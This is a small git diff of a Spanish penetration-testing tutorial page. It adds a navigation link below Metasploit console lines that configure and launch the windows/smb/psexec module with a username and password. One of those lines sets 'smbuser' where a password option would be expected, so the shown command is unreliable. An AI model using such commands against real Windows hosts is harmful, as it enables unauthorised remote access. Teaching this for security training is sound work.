@@ -76,3 +76,5 @@ msf exploit(windows/smb/psexec) > set smbuser usuario
 msf exploit(windows/smb/psexec) > set smbuser contraseña
 msf exploit(windows/smb/psexec) > exploit
 ```
+
+[⟵ Anterior](../../05_sistema.md#explotación-windows)
